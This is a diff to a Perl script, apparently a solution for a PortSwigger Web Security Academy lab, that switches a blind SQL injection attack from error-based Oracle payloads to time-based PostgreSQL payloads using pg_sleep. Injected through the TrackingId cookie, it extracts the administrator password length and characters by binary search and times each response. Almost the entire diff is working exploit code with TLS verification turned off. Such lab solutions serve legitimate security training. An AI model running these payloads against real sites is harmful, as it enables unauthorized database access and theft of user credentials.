@@ -15,7 +15,7 @@ use Term::ANSIColor;
 
 BEGIN {
     say colored("PortSwigger Web Security Academy", "bold yellow");
-    say colored("Lab: Blind SQL injection with conditional errors", "bold yellow");
+    say colored("Lab: Blind SQL injection with time delays and information retrieval", "bold yellow");
     say colored("Solution by weXe1", "bold blue");
     print "\n";
 }
@@ -43,7 +43,7 @@ $maxLength = 20 unless $maxLength;
 
 our $ua = LWP::UserAgent->new(
     cookie_jar  => HTTP::CookieJar::LWP->new(),
-    protocols_allowed   => ['http', 'https']
+    protocols_allowed   => ['http', 'https'],
 );
 $ua->ssl_opts(verify_hostname => 0, SSL_verify_mode => 0x00);
 
@@ -54,7 +54,7 @@ if ($proxy) {
 
 our $requestCount = 0;
 
-say colored("[*] Obtaining password length for user 'administrator', it may take a while... ", "cyan");
+say colored("[*] Obtaining password length for user 'administrator', it will take a long time... ", "cyan");
 
 our $passwordLength = 0;
 
@@ -62,11 +62,11 @@ our $passwordLength = 0;
     my ($begin, $end) = (1, $maxLength);
     while ($begin <= $end) {
         my $middle = int(($begin + $end + 1) / 2);
-        my $payload = uri_encode("TrackingId=' or (select case when (length(password) < $middle) then to_char(1/0) else 'a' end from users where username='administrator')='a");
+        my $payload = "TrackingId='\%3b" . uri_encode(" select case when (length(password) < $middle) then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator");
         my $result = &makeRequest($payload);
 
         if ($begin == $middle && $middle == $end && !$result) {
-            if (&makeRequest(uri_encode("TrackingId=' or (select case when (length(password) = $middle) then to_char(1/0) else 'a' end from users where username='administrator')='a"))) {
+            if (&makeRequest("TrackingId='\%3b". uri_encode(" select case when (length(password) = $middle) then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator"))) {
                 $passwordLength = $middle;
             }
             last;
@@ -87,7 +87,7 @@ if ($passwordLength > 0) {
     exit;
 }
 
-say colored("[*] Obtaining password for user 'administrator', it may take a while... ", "cyan");
+say colored("[*] Obtaining password for user 'administrator', it will take a long time... ", "cyan");
 
 my $password = '';
 my @chars = ('0'..'9', 'A'..'Z', 'a'..'z');
@@ -119,20 +119,24 @@ say colored("[*] Finished in $requestCount requests.", "bold magenta");
 sub generatePayload {
     my $idx = shift;
     my $pass = shift;
-    my $payload = "TrackingId=' or (select case when (substr(password, $idx, 1)<'$pass') then to_char(1/0) else 'a' end from users where username='administrator')='a";  # in this lab db is Oracle
-    $payload = uri_encode($payload);
+    my $payload = " select case when (substr(password, $idx, 1)<'$pass') then pg_sleep(10) else pg_sleep(0) end from users where username = 'administrator";  # in this lab db is PostgreSQL
+    $payload = "TrackingId='\%3b" . uri_encode($payload);
     return $payload;
 }
 
 sub makeRequest {
     my $payload = shift;
+    my $start = time();
     my $response = $ua->get($url, 'Cookie' => $payload);
+    my $end = time();
+    my $timeDiff = $end - $start;
     $requestCount++;
 
     if ($response->is_success) {
+        if ($timeDiff > 9) {
+            return 1;
+        }
         return 0;
-    } elsif($response->decoded_content =~ /internal server error/ig) {
-        return 1;
     } else {
         say STDERR colored($response->status_line . ": [$payload]", "on_red");
         return 0;
